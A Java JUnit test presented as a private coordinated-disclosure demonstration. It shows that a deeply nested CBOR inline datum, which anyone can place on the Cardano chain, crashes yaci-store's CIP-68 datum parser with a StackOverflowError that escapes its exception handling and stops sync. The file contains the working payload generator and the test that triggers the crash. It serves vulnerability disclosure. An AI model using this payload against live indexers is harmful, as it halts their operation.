package com.bloxbean.cardano.yaci.store.extensions.assetstore.cip68.parser;

import org.junit.jupiter.api.Test;

import java.util.concurrent.atomic.AtomicReference;

/**
 * Demonstration for the maintainers (coordinated disclosure — please keep private).
 *
 * <p>An inline datum is attacker-controlled: anyone can create an output whose datum is a
 * deeply nested CBOR value, and the Cardano ledger accepts it (there is no nesting-depth rule;
 * only {@code maxTxSize} = 16384 bytes applies, which allows ~16,000 levels). cbor-java's
 * decoder, used by {@code PlutusData.deserialize}, recurses one frame per level, so a datum
 * nested a few thousand levels deep throws {@link StackOverflowError} here.
 *
 * <p>{@code StackOverflowError} is an {@link Error}, not an {@link Exception}, so
 * {@code Cip68DatumParser.parse}'s {@code catch (Exception)} does not catch it. During sync it
 * propagates out of {@code Cip68Processor} (a synchronous {@code @EventListener}) and stops the
 * fetcher.
 *
 * <p>Runs on a 1 MB stack — the default thread stack on Linux x86_64, where indexers run.
 */
class CborNestingDemoTest {

    private final Cip68DatumParser parser = new Cip68DatumParser();

    /** {@code depth} nested single-element CBOR arrays (0x81) wrapping a 0 — a minimal inline datum. */
    private static String nestedDatumHex(int depth) {
        return "81".repeat(depth) + "00";
    }

    @Test
    void demonstrateDeepNestingOverflow() throws InterruptedException {
        for (int depth : new int[]{1_000, 5_000, 16_000}) {
            String outcome = parseOn1MbStack(nestedDatumHex(depth));
            System.out.printf("Cip68DatumParser.parse, inline datum nested %6d deep -> %s%n", depth, outcome);
        }
    }

    private String parseOn1MbStack(String datumHex) throws InterruptedException {
        AtomicReference<String> outcome = new AtomicReference<>();
        Thread t = new Thread(null, () -> {
            try {
                outcome.set(parser.parse(datumHex).map(p -> "parsed").orElse("skipped (empty)"));
            } catch (Throwable e) {
                outcome.set("*** " + e.getClass().getName() + " — escapes catch(Exception), stops sync ***");
            }
        }, "demo", 1024 * 1024);
        t.start();
        t.join();
        return outcome.get();
    }
}
